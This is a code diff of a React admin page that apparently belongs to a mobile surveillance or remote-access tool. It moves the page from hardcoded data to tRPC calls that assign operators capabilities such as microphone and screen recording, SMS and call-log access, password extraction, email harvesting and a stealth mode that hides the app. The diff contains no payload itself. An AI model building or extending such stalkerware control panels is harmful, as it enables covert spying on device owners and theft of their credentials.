@@ -1,4 +1,3 @@
-// @ts-nocheck
 import { useState } from "react";
 import DashboardLayout from "@/components/DashboardLayout";
 import { Button } from "@/components/ui/button";
@@ -9,13 +8,6 @@ import {
   TabsList,
   TabsTrigger,
 } from "@/components/ui/tabs";
-import {
-  Card,
-  CardContent,
-  CardDescription,
-  CardHeader,
-  CardTitle,
-} from "@/components/ui/card";
 import {
   Shield,
   MapPin,
@@ -30,168 +22,70 @@ import {
   Video,
   Camera,
   Search,
-  Plus,
-  Trash2,
   Edit,
 } from "lucide-react";
 import { toast } from "sonner";
+import { trpc } from "@/lib/trpc";
 
 interface Permission {
-  id: string;
-  name: string;
+  code: string;
   description: string;
-  icon: React.ReactNode;
   category: string;
-  riskLevel: "low" | "medium" | "high" | "critical";
 }
 
-const PERMISSIONS: Permission[] = [
-  {
-    id: "GPS_LOGGING",
-    name: "GPS Logging",
-    description: "Track device location in real-time with GPS coordinates",
-    icon: <MapPin className="w-5 h-5" />,
-    category: "Location",
-    riskLevel: "critical",
-  },
-  {
-    id: "MICROPHONE_RECORDING",
-    name: "Microphone Recording",
-    description: "Record audio from device microphone",
-    icon: <Mic className="w-5 h-5" />,
-    category: "Audio",
-    riskLevel: "critical",
-  },
-  {
-    id: "VIEW_CONTACTS",
-    name: "View Contacts",
-    description: "Access and list all device contacts",
-    icon: <FileText className="w-5 h-5" />,
-    category: "Contacts",
-    riskLevel: "high",
-  },
-  {
-    id: "SMS_LOGS",
-    name: "SMS Logs",
-    description: "Access SMS message history and logs",
-    icon: <MessageSquare className="w-5 h-5" />,
-    category: "Communications",
-    riskLevel: "critical",
-  },
-  {
-    id: "SEND_SMS",
-    name: "Send SMS",
-    description: "Send SMS messages from the device",
-    icon: <MessageSquare className="w-5 h-5" />,
-    category: "Communications",
-    riskLevel: "high",
-  },
-  {
-    id: "CALL_LOGS",
-    name: "Call Logs",
-    description: "Access call history and logs",
-    icon: <Phone className="w-5 h-5" />,
-    category: "Communications",
-    riskLevel: "high",
-  },
-  {
-    id: "VIEW_INSTALLED_APPS",
-    name: "View Installed Apps",
-    description: "List all installed applications",
-    icon: <FileText className="w-5 h-5" />,
-    category: "System",
-    riskLevel: "medium",
-  },
-  {
-    id: "CLIPBOARD_LOGGING",
-    name: "Clipboard Logging",
-    description: "Monitor clipboard content",
-    icon: <Copy className="w-5 h-5" />,
-    category: "Data",
-    riskLevel: "high",
-  },
-  {
-    id: "NOTIFICATION_LOGGING",
-    name: "Notification Logging",
-    description: "Capture system notifications",
-    icon: <Bell className="w-5 h-5" />,
-    category: "System",
-    riskLevel: "medium",
-  },
-  {
-    id: "FILE_EXPLORER",
-    name: "File Explorer",
-    description: "Browse device file system",
-    icon: <FileText className="w-5 h-5" />,
-    category: "Files",
-    riskLevel: "high",
-  },
-  {
-    id: "SCREEN_RECORDING",
-    name: "Screen Recording",
-    description: "Record device screen activity",
-    icon: <Video className="w-5 h-5" />,
-    category: "Media",
-    riskLevel: "critical",
-  },
-  {
-    id: "CAMERA_ACCESS",
-    name: "Camera Access",
-    description: "Access device camera",
-    icon: <Camera className="w-5 h-5" />,
-    category: "Media",
-    riskLevel: "critical",
-  },
-  {
-    id: "LOCATION_TRACKING",
-    name: "Location Tracking",
-    description: "Continuous location tracking",
-    icon: <MapPin className="w-5 h-5" />,
-    category: "Location",
-    riskLevel: "critical",
-  },
-  {
-    id: "EMAIL_HARVESTING",
-    name: "Email Harvesting",
-    description: "Extract email addresses from device",
-    icon: <FileText className="w-5 h-5" />,
-    category: "Data",
-    riskLevel: "high",
-  },
-  {
-    id: "PASSWORD_EXTRACTION",
-    name: "Password Extraction",
-    description: "Extract stored passwords",
-    icon: <Lock className="w-5 h-5" />,
-    category: "Security",
-    riskLevel: "critical",
-  },
-  {
-    id: "STEALTH_MODE",
-    name: "Stealth Mode",
-    description: "Hide app from system",
-    icon: <Eye className="w-5 h-5" />,
-    category: "System",
-    riskLevel: "high",
-  },
-];
-
-interface UserPermission {
-  userId: number;
-  userName: string;
-  permissions: string[];
-}
+const PERMISSION_ICONS: Record<string, React.ReactNode> = {
+  GPS_LOGGING: <MapPin className="w-5 h-5" />,
+  MICROPHONE_RECORDING: <Mic className="w-5 h-5" />,
+  VIEW_CONTACTS: <FileText className="w-5 h-5" />,
+  SMS_LOGS: <MessageSquare className="w-5 h-5" />,
+  SEND_SMS: <MessageSquare className="w-5 h-5" />,
+  CALL_LOGS: <Phone className="w-5 h-5" />,
+  VIEW_INSTALLED_APPS: <FileText className="w-5 h-5" />,
+  CLIPBOARD_LOGGING: <Copy className="w-5 h-5" />,
+  NOTIFICATION_LOGGING: <Bell className="w-5 h-5" />,
+  FILE_EXPLORER: <FileText className="w-5 h-5" />,
+  SCREEN_RECORDING: <Video className="w-5 h-5" />,
+  CAMERA_ACCESS: <Camera className="w-5 h-5" />,
+  LOCATION_TRACKING: <MapPin className="w-5 h-5" />,
+  EMAIL_HARVESTING: <FileText className="w-5 h-5" />,
+  PASSWORD_EXTRACTION: <Lock className="w-5 h-5" />,
+  STEALTH_MODE: <Eye className="w-5 h-5" />,
+};
 
 export default function Permissions() {
   const [searchTerm, setSearchTerm] = useState("");
   const [selectedCategory, setSelectedCategory] = useState<string>("all");
-  const [userPermissions, setUserPermissions] = useState<UserPermission[]>([
-    { userId: 1, userName: "Admin User", permissions: PERMISSIONS.map((p) => p.id) },
-    { userId: 2, userName: "Manager User", permissions: ["GPS_LOGGING", "SMS_LOGS", "CALL_LOGS"] },
-    { userId: 3, userName: "Standard User", permissions: ["GPS_LOGGING", "VIEW_CONTACTS"] },
-  ]);
+  const utils = trpc.useUtils();
 
-  const categories = ["all", ...Array.from(new Set(PERMISSIONS.map((p) => p.category)))];
+  const { data: allUsers = [] } = trpc.users.getAll.useQuery();
+  const { data: allPermissions = [] } = trpc.permissions.getAllPermissions.useQuery();
+  const { data: categories = ["all"] } = trpc.permissions.getCategories.useQuery(undefined, {
+    select: (data) => ["all", ...data.map((c) => c.name)],
+  });
+
+  const assignMutation = trpc.permissions.assignUserPermission.useMutation({
+    onSuccess: () => {
+      toast.success("Permission assigned");
+      utils.permissions.getUserPermissions.invalidate();
+    },
+    onError: (err) => toast.error(err.message),
+  });
+
+  const revokeMutation = trpc.permissions.revokeUserPermission.useMutation({
+    onSuccess: () => {
+      toast.success("Permission revoked");
+      utils.permissions.getUserPermissions.invalidate();
+    },
+    onError: (err) => toast.error(err.message),
+  });
+
+  const getRiskLevel = (code: string) => {
+    const critical = ["GPS_LOGGING", "MICROPHONE_RECORDING", "SMS_LOGS", "SCREEN_RECORDING", "PASSWORD_EXTRACTION"];
+    const high = ["CAMERA_ACCESS", "FILE_EXPLORER", "CLIPBOARD_LOGGING", "SEND_SMS"];
+    if (critical.includes(code)) return "critical";
+    if (high.includes(code)) return "high";
+    return "medium";
+  };
 
   const getRiskColor = (level: string) => {
     switch (level) {
@@ -206,26 +100,12 @@ export default function Permissions() {
     }
   };
 
-  const filteredPermissions: Permission[] = PERMISSIONS.filter((perm) => {
-    const matchesSearch = perm.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+  const filteredPermissions = allPermissions.filter((perm) => {
+    const matchesSearch = perm.code.toLowerCase().includes(searchTerm.toLowerCase()) ||
       perm.description.toLowerCase().includes(searchTerm.toLowerCase());
     const matchesCategory = selectedCategory === "all" || perm.category === selectedCategory;
     return matchesSearch && matchesCategory;
   });
-
-  const toggleUserPermission = (userId: number, permissionId: string): void => {
-    setUserPermissions((prev) =>
-      prev.map((up) => {
-        if (up.userId === userId) {
-          const newPerms = up.permissions.includes(permissionId)
-            ? up.permissions.filter((p) => p !== permissionId)
-            : [...up.permissions, permissionId];
-          return { ...up, permissions: newPerms };
-        }
-        return up;
-      })
-    );
-  };
 
   return (
     <DashboardLayout title="Permission Management">
@@ -242,23 +122,19 @@ export default function Permissions() {
             </TabsTrigger>
           </TabsList>
 
-          {/* All Permissions Tab */}
           <TabsContent value="permissions" className="space-y-6">
-            {/* Search and Filter */}
             <div className="card-neon p-4">
               <div className="flex flex-col md:flex-row gap-4">
-                <div className="flex-1">
-                  <div className="relative">
-                    <Search className="absolute left-3 top-3 w-5 h-5 text-muted-foreground" />
-                    <Input
-                      placeholder="Search permissions..."
-                      value={searchTerm}
-                      onChange={(e) => setSearchTerm(e.target.value)}
-                      className="input-neon pl-10"
-                    />
-                  </div>
+                <div className="relative flex-1">
+                  <Search className="absolute left-3 top-3 w-5 h-5 text-muted-foreground" />
+                  <Input
+                    placeholder="Search permissions..."
+                    value={searchTerm}
+                    onChange={(e) => setSearchTerm(e.target.value)}
+                    className="input-neon pl-10"
+                  />
                 </div>
-                <div className="flex gap-2 overflow-x-auto">
+                <div className="flex gap-2 overflow-x-auto pb-2">
                   {categories.map((cat) => (
                     <Button
                       key={cat}
@@ -268,118 +144,107 @@ export default function Permissions() {
                       }`}
                       size="sm"
                     >
-                      {cat.charAt(0).toUpperCase() + cat.slice(1)}
+                      {cat}
                     </Button>
                   ))}
                 </div>
               </div>
             </div>
 
-            {/* Permissions Grid */}
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
               {filteredPermissions.map((perm) => (
-                <div key={perm.id} className="card-neon p-4">
+                <div key={perm.code} className="card-neon p-4">
                   <div className="flex items-start justify-between mb-3">
                     <div className="flex items-start gap-3">
-                      <div className="text-purple-400 mt-1">{perm.icon}</div>
+                      <div className="text-purple-400 mt-1">
+                        {PERMISSION_ICONS[perm.code] || <Shield className="w-5 h-5" />}
+                      </div>
                       <div>
-                        <h4 className="font-bold text-sm">{perm.name}</h4>
+                        <h4 className="font-bold text-sm">{perm.code.replace(/_/g, " ")}</h4>
                         <p className="text-xs text-muted-foreground">{perm.category}</p>
                       </div>
                     </div>
-                    <span
-                      className={`text-xs font-bold px-2 py-1 rounded border-2 ${getRiskColor(
-                        perm.riskLevel
-                      )}`}
-                    >
-                      {perm.riskLevel.toUpperCase()}
+                    <span className={`text-xs font-bold px-2 py-1 rounded border-2 ${getRiskColor(getRiskLevel(perm.code))}`}>
+                      {getRiskLevel(perm.code).toUpperCase()}
                     </span>
                   </div>
                   <p className="text-xs text-muted-foreground mb-3">{perm.description}</p>
-                  <div className="flex items-center gap-2 text-xs text-muted-foreground">
-                    <code className="bg-accent/20 px-2 py-1 rounded font-mono">
-                      {perm.id}
-                    </code>
-                  </div>
                 </div>
               ))}
             </div>
-
-            {filteredPermissions.length === 0 && (
-              <div className="text-center py-12">
-                <Shield className="w-12 h-12 glow-cyan mx-auto mb-4 opacity-50" />
-                <p className="text-muted-foreground">No permissions found</p>
-              </div>
-            )}
           </TabsContent>
 
-          {/* User Assignments Tab */}
           <TabsContent value="users" className="space-y-6">
-            {userPermissions.map((userPerm) => (
-              <div key={userPerm.userId} className="card-neon">
-                <div className="border-b border-glow-cyan pb-4 mb-4">
-                  <div className="flex items-center justify-between">
-                    <div>
-                      <h3 className="text-lg font-bold">{userPerm.userName}</h3>
-                      <p className="text-sm text-muted-foreground">
-                        {userPerm.permissions.length} permissions assigned
-                      </p>
-                    </div>
-                    <Button className="btn-neon-cyan" size="sm">
-                      <Edit className="w-4 h-4 mr-2" />
-                      Edit
-                    </Button>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
-                  {PERMISSIONS.map((perm) => {
-                    const isAssigned = userPerm.permissions.includes(perm.id);
-                    return (
-                      <button
-                        key={perm.id}
-                        onClick={() => toggleUserPermission(userPerm.userId, perm.id)}
-                        className={`p-3 rounded border-2 transition-all text-left ${
-                          isAssigned
-                            ? "border-glow-cyan bg-cyan-500/10"
-                            : "border-glow-cyan/30 bg-accent/5 hover:bg-accent/10"
-                        }`}
-                      >
-                        <div className="flex items-start gap-2">
-                          <div className={isAssigned ? "text-cyan-400" : "text-muted-foreground"}>
-                            {perm.icon}
-                          </div>
-                          <div className="flex-1">
-                            <p className="text-xs font-bold">{perm.name}</p>
-                            <p className={`text-xs mt-1 ${
-                              isAssigned ? "text-cyan-300" : "text-muted-foreground"
-                            }`}>
-                              {isAssigned ? "✓ Assigned" : "Not assigned"}
-                            </p>
-                          </div>
-                        </div>
-                      </button>
-                    );
-                  })}
-                </div>
-              </div>
+            {allUsers.map((user) => (
+              <UserPermissionCard
+                key={user.id}
+                user={user}
+                allPermissions={allPermissions}
+                assignMutation={assignMutation}
+                revokeMutation={revokeMutation}
+              />
             ))}
           </TabsContent>
         </Tabs>
 
-        {/* Legal Notice */}
         <div className="border-2 border-yellow-500 bg-yellow-500/10 p-4 rounded-lg">
           <p className="text-sm font-medium text-yellow-400 mb-2">
             ⚠️ Permission Assignment Warning
           </p>
           <p className="text-xs text-muted-foreground">
-            Granting permissions to users is a critical security decision. Only assign
-            permissions that are absolutely necessary for the user's role. Regularly audit
-            and revoke unused permissions. Critical-level permissions should only be granted
-            to trusted administrators.
+            Granting permissions is critical. Regularly audit and revoke unused permissions.
           </p>
         </div>
       </div>
     </DashboardLayout>
+  );
+}
+
+function UserPermissionCard({ user, allPermissions, assignMutation, revokeMutation }) {
+  const { data: userPerms = [], isLoading } = trpc.permissions.getUserPermissions.useQuery({ userId: user.id });
+  const userPermCodes = userPerms.map(p => p.code);
+
+  const toggle = (code) => {
+    if (userPermCodes.includes(code)) {
+      revokeMutation.mutate({ userId: user.id, permission: code });
+    } else {
+      assignMutation.mutate({ userId: user.id, permission: code });
+    }
+  };
+
+  return (
+    <div className="card-neon mb-6">
+      <div className="border-b border-glow-cyan pb-4 mb-4">
+        <h3 className="text-lg font-bold">{user.name || user.email}</h3>
+        <p className="text-sm text-muted-foreground">{userPerms.length} permissions assigned</p>
+      </div>
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+        {allPermissions.map((perm) => {
+          const isAssigned = userPermCodes.includes(perm.code);
+          return (
+            <button
+              key={perm.code}
+              disabled={isLoading || assignMutation.isPending || revokeMutation.isPending}
+              onClick={() => toggle(perm.code)}
+              className={`p-3 rounded border-2 transition-all text-left ${
+                isAssigned ? "border-glow-cyan bg-cyan-500/10" : "border-glow-cyan/30 bg-accent/5"
+              }`}
+            >
+              <div className="flex items-start gap-2">
+                <div className={isAssigned ? "text-cyan-400" : "text-muted-foreground"}>
+                  {PERMISSION_ICONS[perm.code] || <Shield className="w-5 h-5" />}
+                </div>
+                <div className="flex-1">
+                  <p className="text-xs font-bold">{perm.code.replace(/_/g, " ")}</p>
+                  <p className={`text-xs mt-1 ${isAssigned ? "text-cyan-300" : "text-muted-foreground"}`}>
+                    {isAssigned ? "✓ Assigned" : "Not assigned"}
+                  </p>
+                </div>
+              </div>
+            </button>
+          );
+        })}
+      </div>
+    </div>
   );
 }
